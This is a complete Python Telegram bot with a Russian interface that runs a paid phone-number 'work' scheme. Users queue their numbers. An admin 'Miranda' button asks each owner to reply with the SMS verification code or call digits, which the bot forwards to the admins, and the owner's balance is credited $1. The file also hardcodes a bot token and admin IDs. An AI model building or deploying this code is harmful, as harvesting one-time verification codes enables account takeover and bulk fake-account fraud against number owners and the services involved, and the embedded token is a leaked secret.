import asyncio
import json
import re
from datetime import datetime
from pathlib import Path
from typing import Dict, Any

from telegram import (
    Update,
    InlineKeyboardMarkup,
    InlineKeyboardButton,
    InputFile,
)
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    ContextTypes,
    CallbackQueryHandler,
    MessageHandler,
    filters,
)

BOT_TOKEN = "8397931482:AAGaMfST4p7XxIz5I6AllYWK-z18oz9ATBM"
ADMINS = [8384293541, 403783852]

BASE = Path(__file__).parent
DATA_PATH = BASE / "data.json"
START_PHOTO = BASE / "start.jpg"
CHANNEL_USERNAME = "@Fast_codek"


async def show_menu_message(user_id: int, chat_id: int, context: ContextTypes.DEFAULT_TYPE, text: str, kb=None):
    """Edit the stored start message for the user, or send a new one and store it."""
    data = load_data()
    u = get_user_entry(data, user_id)
    start_msg = u.get("start_message")
    try:
        if start_msg:
            if start_msg.get("is_photo"):
                await context.bot.edit_message_caption(chat_id=start_msg["chat_id"], message_id=start_msg["message_id"], caption=text, reply_markup=kb)
            else:
                await context.bot.edit_message_text(chat_id=start_msg["chat_id"], message_id=start_msg["message_id"], text=text, reply_markup=kb)
            return
    except Exception:
        pass

    if START_PHOTO.exists():
        with START_PHOTO.open("rb") as f:
            sent = await context.bot.send_photo(chat_id=chat_id, photo=InputFile(f), caption=text, reply_markup=kb)
            u["start_message"] = {"chat_id": chat_id, "message_id": sent.message_id, "is_photo": True}
    else:
        sent = await context.bot.send_message(chat_id=chat_id, text=text, reply_markup=kb)
        u["start_message"] = {"chat_id": chat_id, "message_id": sent.message_id, "is_photo": False}
    save_data(data)


async def is_subscribed(user_id: int, context: ContextTypes.DEFAULT_TYPE) -> bool:
    try:
        member = await context.bot.get_chat_member(chat_id=CHANNEL_USERNAME, user_id=user_id)
        return member.status not in ("left", "kicked")
    except Exception:
        return False


async def send_subscribe_prompt(user_id: int, chat_id: int, context: ContextTypes.DEFAULT_TYPE):
    kb = InlineKeyboardMarkup([
        [InlineKeyboardButton("Перейти", url=f"https://t.me/{CHANNEL_USERNAME.lstrip('@')}")],
        [InlineKeyboardButton("Проверил", callback_data="check_sub")],
    ])
    await show_menu_message(user_id, chat_id, context, "Пожалуйста, подпишитесь на канал Fast_codek чтобы продолжить.", kb)



def load_data() -> Dict[str, Any]:
    if not DATA_PATH.exists():
        return {"users": {}, "queue": [], "withdrawals": [], "awaiting_code": {}, "user_state": {}}
    with DATA_PATH.open("r", encoding="utf-8") as f:
        return json.load(f)


def save_data(data: Dict[str, Any]):
    with DATA_PATH.open("w", encoding="utf-8") as f:
        json.dump(data, f, ensure_ascii=False, indent=2)


def get_user_entry(data, user_id, username=None):
    users = data.setdefault("users", {})
    key = str(user_id)
    if key not in users:
        users[key] = {"balance": 0.0, "numbers": [], "username": username or ""}
    else:
        if username:
            users[key]["username"] = username
    return users[key]


def format_start_message(username: str, user_id: int, data: Dict[str, Any]) -> str:
    user_numbers = len([q for q in data.get("queue", []) if q.get("user_id") == user_id])
    total = len(data.get("queue", []))
    balance = get_user_entry(data, user_id).get("balance", 0.0)
    return (
        f"👋 Приветствую, {username}\n\n"
        f"Статус ворка: ✅\n\n"
        f"💰 Ваш баланс: ${balance:.2f}\n\n"
        f"Статистика:\n"
        f"├ Ваших номеров в очереди: {user_numbers}\n"
        f"╰ Всего в очереди: {total}\n\n"
        f"Выберите действие:"
    )


def main_menu_keyboard(is_admin=False):
    buttons = [
        [InlineKeyboardButton("📱Добавить номер", callback_data="add_number")],
        [InlineKeyboardButton("📋Мои номера", callback_data="my_numbers")],
        [InlineKeyboardButton("💵Вывод", callback_data="withdraw")],
        [InlineKeyboardButton("❓Помощь", url="https://t.me/o392oo")],
    ]
    if is_admin:
        buttons.append([InlineKeyboardButton("⚙️Админ панель", callback_data="admin_panel")])
    return InlineKeyboardMarkup(buttons)


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    data = load_data()
    user = update.effective_user
    username = f"@{user.username}" if user.username else user.first_name
    # require subscription for non-admins
    if user.id not in ADMINS:
        subscribed = await is_subscribed(user.id, context)
        if not subscribed:
            await send_subscribe_prompt(user.id, update.effective_chat.id, context)
            return

    get_user_entry(data, user.id, username)
    save_data(data)

    text = format_start_message(username, user.id, data)
    kb = main_menu_keyboard(is_admin=(user.id in ADMINS))

    await show_menu_message(user.id, update.effective_chat.id, context, text, kb)


async def callback_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = load_data()
    user = query.from_user
    is_admin = user.id in ADMINS
    parts = query.data.split(":")
    cmd = parts[0]

    # enforce subscription for non-admins (allow pressing "Проверил" -> check_sub)
    if not is_admin:
        subscribed = await is_subscribed(user.id, context)
        if not subscribed and cmd != "check_sub":
            await send_subscribe_prompt(user.id, query.message.chat_id, context)
            return

    if cmd == "add_number":
        data.setdefault("user_state", {})[str(user.id)] = "adding_number"
        save_data(data)
        await show_menu_message(user.id, query.message.chat_id, context, "Отправьте номер без пробелов и лишних символов (пример: +79161234567 или 79161234567)")

    elif cmd == "my_numbers":
        q = [x for x in data.get("queue", []) if x.get("user_id") == user.id]
        if not q:
            await show_menu_message(user.id, query.message.chat_id, context, "У вас нет номеров в очереди.")
        else:
            txt = "Ваши номера в очереди:\n\n"
            for e in q:
                txt += f"{e.get('number')} — подан: {e.get('timestamp')}\n"
            await show_menu_message(user.id, query.message.chat_id, context, txt)

    elif cmd == "withdraw":
        data.setdefault("user_state", {})[str(user.id)] = "withdrawing_amount"
        save_data(data)
        await show_menu_message(user.id, query.message.chat_id, context, "Введите сумму вывода (цифрами, без знака $):")

    elif cmd == "help":
        await show_menu_message(user.id, query.message.chat_id, context, "Если нужна помощь — опишите вопрос, админы ответят.")

    elif cmd == "admin_panel" and is_admin:
        kb = InlineKeyboardMarkup([
            [InlineKeyboardButton("Очередь", callback_data="admin_queue:0")],
            [InlineKeyboardButton("Заявки на вывод", callback_data="admin_withdrawals:0")],
            [InlineKeyboardButton("Назад", callback_data="admin_back")],
        ])
        await show_menu_message(user.id, query.message.chat_id, context, "Админ панель", kb)

    elif cmd == "admin_back" and is_admin:
        
        data = load_data()
        username = f"@{user.username}" if user.username else user.first_name
        text = format_start_message(username, user.id, data)
        kb = main_menu_keyboard(is_admin=is_admin)
        await show_menu_message(user.id, query.message.chat_id, context, text, kb)

    elif cmd == "admin_queue" and is_admin:
        page = int(parts[1]) if len(parts) > 1 else 0
        queue = data.get("queue", [])
        per = 5
        start_i = page * per
        chunk = queue[start_i:start_i + per]
        kb_buttons = []
        for e in chunk:
            uname = e.get("username") or "(no name)"
            uid = e.get("user_id")
            label = f"{uname},{uid}({uid})"
            kb_buttons.append([InlineKeyboardButton(label, callback_data=f"admin_view_queue:{e.get('id')}")])
        nav = []
        if page > 0:
            nav.append(InlineKeyboardButton("⬅️", callback_data=f"admin_queue:{page-1}"))
        if start_i + per < len(queue):
            nav.append(InlineKeyboardButton("➡️", callback_data=f"admin_queue:{page+1}"))
        if nav:
            kb_buttons.append(nav)
        kb_buttons.append([InlineKeyboardButton("Назад", callback_data="admin_panel")])
        await show_menu_message(user.id, query.message.chat_id, context, f"Очередь — страница {page+1}", InlineKeyboardMarkup(kb_buttons))

    elif cmd == "admin_view_queue" and is_admin:
        entry_id = parts[1]
        entry = next((x for x in data.get("queue", []) if str(x.get("id")) == str(entry_id)), None)
        if not entry:
            await show_menu_message(user.id, query.message.chat_id, context, "Запись не найдена")
            return
        txt = f"@{entry.get('username')}\n{entry.get('user_id')}\n{entry.get('number')}\n{entry.get('timestamp')}"
        kb = InlineKeyboardMarkup([
            [InlineKeyboardButton("Миранда", callback_data=f"admin_miranda:{entry_id}"), InlineKeyboardButton("Подтвердить", callback_data=f"admin_confirm:{entry_id}"), InlineKeyboardButton("Отклонить", callback_data=f"admin_reject:{entry_id}")],
            [InlineKeyboardButton("Назад", callback_data="admin_queue:0")],
        ])
        await show_menu_message(user.id, query.message.chat_id, context, txt, kb)

    elif cmd == "admin_miranda" and is_admin:
        entry_id = parts[1]
        entry = next((x for x in data.get("queue", []) if str(x.get("id")) == str(entry_id)), None)
        if not entry:
            await show_menu_message(user.id, query.message.chat_id, context, "Запись не найдена")
            return
        user_id = entry.get("user_id")
        number = entry.get("number")
        miranda_text = (
            f"Ваш номер \"{number}\" взяли в работу.\n"
            "Пожалуйста, отправьте ОТВЕТОМ на это сообщение код из СМС.\n"
            "Если звонок - последние 6 цифр номера."
        )
        sent = await context.bot.send_message(chat_id=user_id, text=miranda_text)
        
        data.setdefault("awaiting_code", {})[str(sent.message_id)] = {"user_id": user_id, "number": number, "queue_id": entry.get("id")}
        save_data(data)
        await show_menu_message(user.id, query.message.chat_id, context, "Сообщение с просьбой коду отправлено пользователю.")

    elif cmd == "check_sub":
        subscribed = await is_subscribed(user.id, context)
        if subscribed:
            data = load_data()
            username = f"@{user.username}" if user.username else user.first_name
            get_user_entry(data, user.id, username)
            save_data(data)
            text = format_start_message(username, user.id, data)
            kb = main_menu_keyboard(is_admin=is_admin)
            await show_menu_message(user.id, query.message.chat_id, context, text, kb)
        else:
            await send_subscribe_prompt(user.id, query.message.chat_id, context)
        return

    elif cmd == "admin_confirm" and is_admin:
        entry_id = parts[1]
        entry = next((x for x in data.get("queue", []) if str(x.get("id")) == str(entry_id)), None)
        if not entry:
            await show_menu_message(user.id, query.message.chat_id, context, "Запись не найдена")
            return
        user_id = entry.get("user_id")
        uentry = get_user_entry(data, user_id)
        uentry["balance"] = round(uentry.get("balance", 0.0) + 1.0, 2)
        
        try:
            data["queue"] = [x for x in data.get("queue", []) if str(x.get("id")) != str(entry.get("id"))]
        except Exception:
            pass
        try:
            nums = get_user_entry(data, user_id).setdefault("numbers", [])
            if entry.get("id") in nums:
                nums.remove(entry.get("id"))
        except Exception:
            pass
        save_data(data)
        
        try:
            await context.bot.send_message(chat_id=user_id, text=f"Ваш номер \"{entry.get('number')}\" подтверждён — вам начислен $1.")
        except Exception:
            pass
        await show_menu_message(user.id, query.message.chat_id, context, f"Пользователю {entry.get('username')} начислен $1 и запись удалена из очереди")

    elif cmd == "admin_reject" and is_admin:
        entry_id = parts[1]
        entry = next((x for x in data.get("queue", []) if str(x.get("id")) == str(entry_id)), None)
        if not entry:
            await show_menu_message(user.id, query.message.chat_id, context, "Запись не найдена")
            return
        user_id = entry.get("user_id")
        
        try:
            data["queue"] = [x for x in data.get("queue", []) if str(x.get("id")) != str(entry.get("id"))]
        except Exception:
            pass
        try:
            nums = get_user_entry(data, user_id).setdefault("numbers", [])
            if entry.get("id") in nums:
                nums.remove(entry.get("id"))
        except Exception:
            pass
        save_data(data)
        
        try:
            await context.bot.send_message(chat_id=user_id, text=f"Ваша заявка для номера \"{entry.get('number')}\" была отклонена администрацией.")
        except Exception:
            pass
        await show_menu_message(user.id, query.message.chat_id, context, "Заявка отклонена и удалена из очереди.")

    elif cmd == "admin_withdrawals" and is_admin:
        page = int(parts[1]) if len(parts) > 1 else 0
        withs = data.get("withdrawals", [])
        per = 5
        start_i = page * per
        chunk = withs[start_i:start_i + per]
        kb_buttons = []
        for w in chunk:
            label = f"{w.get('username')},{w.get('user_id')}({w.get('user_id')}) - ${w.get('amount')}"
            kb_buttons.append([InlineKeyboardButton(label, callback_data=f"admin_view_withdraw:{w.get('id')}")])
        nav = []
        if page > 0:
            nav.append(InlineKeyboardButton("⬅️", callback_data=f"admin_withdrawals:{page-1}"))
        if start_i + per < len(withs):
            nav.append(InlineKeyboardButton("➡️", callback_data=f"admin_withdrawals:{page+1}"))
        if nav:
            kb_buttons.append(nav)
        kb_buttons.append([InlineKeyboardButton("Назад", callback_data="admin_panel")])
        await show_menu_message(user.id, query.message.chat_id, context, f"Заявки на вывод — страница {page+1}", InlineKeyboardMarkup(kb_buttons))

    elif cmd == "admin_view_withdraw" and is_admin:
        wid = parts[1]
        w = next((x for x in data.get("withdrawals", []) if str(x.get("id")) == str(wid)), None)
        if not w:
            await show_menu_message(user.id, query.message.chat_id, context, "Заявка не найдена")
            return
        txt = f"@{w.get('username')}\n{w.get('user_id')}\n{w.get('amount')}\n{w.get('timestamp')}"
        await show_menu_message(user.id, query.message.chat_id, context, txt)


def valid_number(text: str) -> bool:
    if not text:
        return False
    text = text.strip()
    m = re.match(r"^\+?\d{7,15}$", text)
    return bool(m)


async def text_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = update.message
    if not msg:
        return
    data = load_data()
    user = msg.from_user
    uid = str(user.id)

    if user.id not in ADMINS:
        subscribed = await is_subscribed(user.id, context)
        if not subscribed:
            await send_subscribe_prompt(user.id, msg.chat.id, context)
            return

    # First, check if this message is a reply to a bot 'miranda' request
    if msg.reply_to_message and str(msg.reply_to_message.message_id) in data.get("awaiting_code", {}):
        mapping = data["awaiting_code"].pop(str(msg.reply_to_message.message_id))
        save_data(data)
        code = msg.text.strip()
        number = mapping.get("number")
        for a in ADMINS:
            try:
                await context.bot.send_message(chat_id=a, text=f'Новый код! "{code}" к номеру "{number}"')
            except Exception:
                pass
        await msg.reply_text("Код отправлен админам.")
        return

    state = data.setdefault("user_state", {}).get(uid)
    if state == "adding_number":
        text = msg.text.strip()
        if not valid_number(text):
            await msg.reply_text("Неверный формат номера. Отправьте номер без пробелов, например +79161234567")
            return
        # add to queue
        q = data.setdefault("queue", [])
        entry_id = int(datetime.utcnow().timestamp() * 1000)
        username = user.username or user.first_name
        entry = {"id": entry_id, "user_id": user.id, "username": username, "number": text, "timestamp": datetime.utcnow().isoformat()}
        q.append(entry)
        # add to user's list
        u = get_user_entry(data, user.id, username)
        u.setdefault("numbers", []).append(entry_id)
        data["user_state"][uid] = None
        save_data(data)
        await msg.reply_text("Ваша заявка передана в очередь, ожидайте отклик в ближайшее время.")
        return

    if state == "withdrawing_amount":
        text = msg.text.strip().replace(',', '.')
        try:
            amount = float(text)
        except ValueError:
            await msg.reply_text("Неверный формат суммы. Введите число, например 5 или 2.5")
            return
        u = get_user_entry(data, user.id)
        if amount <= 0 or amount > u.get("balance", 0.0):
            await msg.reply_text("Недостаточно средств или неверная сумма")
            return
        wid = int(datetime.utcnow().timestamp() * 1000)
        w = {"id": wid, "user_id": user.id, "username": user.username or user.first_name, "amount": amount, "timestamp": datetime.utcnow().isoformat(), "status": "pending"}
        data.setdefault("withdrawals", []).append(w)
        data["user_state"][uid] = None
        # deduct immediately from balance
        u["balance"] = round(u.get("balance", 0.0) - amount, 2)
        save_data(data)
        await msg.reply_text("Заявка на вывод создана и отправлена администраторам.")
        # notify admins
        for a in ADMINS:
            try:
                await context.bot.send_message(chat_id=a, text=f"Новая заявка на вывод:\n@{w.get('username')}\n{w.get('user_id')}\n{w.get('amount')}\n{w.get('timestamp')}")
            except Exception:
                pass
        return


def main():
    if BOT_TOKEN == "REPLACE_WITH_YOUR_TOKEN":
        print("Please set BOT_TOKEN in config.py")
        return
    application = ApplicationBuilder().token(BOT_TOKEN).build()

    application.add_handler(CommandHandler("start", start))
    application.add_handler(CallbackQueryHandler(callback_router))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, text_handler))

    print("Bot is running...")
    application.run_polling()


if __name__ == "__main__":
    main()
